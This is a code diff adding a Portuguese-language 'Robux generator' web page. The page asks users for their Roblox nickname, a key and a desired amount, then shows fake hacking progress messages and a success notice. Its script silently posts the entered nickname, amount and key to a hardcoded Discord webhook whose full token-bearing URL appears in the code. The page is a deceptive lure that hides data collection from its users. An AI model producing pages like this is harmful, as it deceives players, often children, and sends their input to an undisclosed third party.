@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Gerador de Robux</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
+    * { box-sizing: border-box }
+    body {
+      background: #0f0f0f;
+      color: #eee;
+      font-family: 'Orbitron', monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+      height: 100vh;
+      margin: 0;
+    }
+    h1 {
+      font-size: 3rem;
+      margin-bottom: 10px;
+      text-transform: uppercase;
+    }
+    #proletario {
+      font-size: 2rem;
+      font-weight: bold;
+      margin-top: auto;
+      margin-bottom: 30px;
+      background: linear-gradient(270deg, #ff0055, #00ffff, #ffff00, #ff0055);
+      background-size: 800% 800%;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: colorShift 12s ease infinite;
+    }
+    @keyframes colorShift {
+      0% { background-position: 0% 50% }
+      50% { background-position: 100% 50% }
+      100% { background-position: 0% 50% }
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-size: 1.2rem;
+    }
+    input {
+      width: 250px;
+      padding: 8px;
+      font-size: 1.1rem;
+      border: none;
+      border-radius: 5px;
+      margin-top: 5px;
+    }
+    button {
+      margin-top: 25px;
+      background: linear-gradient(45deg, #00ff00, #00ffff);
+      border: none;
+      padding: 12px 25px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: #000;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.4s ease;
+    }
+    button:hover {
+      background: linear-gradient(45deg, #00ffff, #00ff00);
+    }
+    #output {
+      margin-top: 30px;
+      min-height: 120px;
+      font-family: monospace;
+      font-size: 1.2rem;
+      white-space: pre-wrap;
+    }
+    .red { color: #ff4444 }
+    .green { color: #44ff44 }
+    .blue { color: #44aaff }
+  </style>
+</head>
+<body>
+
+<h1>gerador de robux</h1>
+
+<label for="nick">NICK 👤</label>
+<input type="text" id="nick" placeholder="Digite seu nick" autocomplete="off" />
+
+<label for="chave">🔑 Sua chave</label>
+<input type="text" id="chave" placeholder="Cole a chave recebida" autocomplete="off" />
+
+<label for="quant">QUANTIDADE 💎</label>
+<input type="number" id="quant" placeholder="Ex.: 10000" autocomplete="off" />
+
+<button id="gerarBtn">Gerar Robux</button>
+
+<div id="output"></div>
+
+<div id="proletario">MR_RZGHZIN</div>
+
+<script>
+  const gerarBtn = document.getElementById('gerarBtn');
+  const output = document.getElementById('output');
+  const webhook = "https://discord.com/api/webhooks/1385371077902995476/oY8q8gB1YvmCDToE3QVWL_3P1pVL6dCtN26PqYevOMfLOhywuzSEW-FvNlU2Fbc8hjkE";
+
+  const steps = [
+    { text: "Validando chave...", color: "blue" },
+    { text: "Gerando Robux...", color: "green" },
+    { text: "Injetando scripts ####", color: "blue" },
+    { text: "Quase lá…", color: "red" },
+    { text: "Hackeando cofres intergalácticos", color: "green" },
+    { text: "Conectando aos servidores ocultos", color: "blue" },
+    { text: "Finalizando…", color: "red" },
+  ];
+
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+  async function simulaGeracao(nick, quant, chave) {
+    output.innerHTML = "";
+    for (const s of steps) {
+      output.innerHTML = `<span class="${s.color}">${s.text}</span>`;
+      await sleep(1200);
+    }
+
+    output.innerHTML += `\n<span class="green">Chave validada com sucesso ✅</span>`;
+    output.innerHTML += `\n<span class="green">Pronto! Você recebeu ${quant} R$ (simulado)</span>`;
+    output.innerHTML += `\n<span class="blue">Uso único da chave: "${chave}" registrado</span>`;
+
+    // Envia pro webhook
+    fetch(webhook, {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: `🎮 Nick: **${nick}**\n💰 Quantidade: **${quant} R$**\n🔑 Chave usada: **${chave}**`
+      })
+    }).catch(err => {
+      console.warn("Falha ao enviar pro webhook:", err);
+    });
+  }
+
+  gerarBtn.onclick = () => {
+    const nick = document.getElementById('nick').value.trim();
+    const quant = document.getElementById('quant').value.trim();
+    const chave = document.getElementById('chave').value.trim();
+
+    if (!nick || !quant || !chave) {
+      output.innerHTML = '<span class="red">Preencha Nick, Quantidade e a Chave!</span>';
+      return;
+    }
+
+    simulaGeracao(nick, quant, chave);
+  };
+</script>
+
+</body>
+</html>
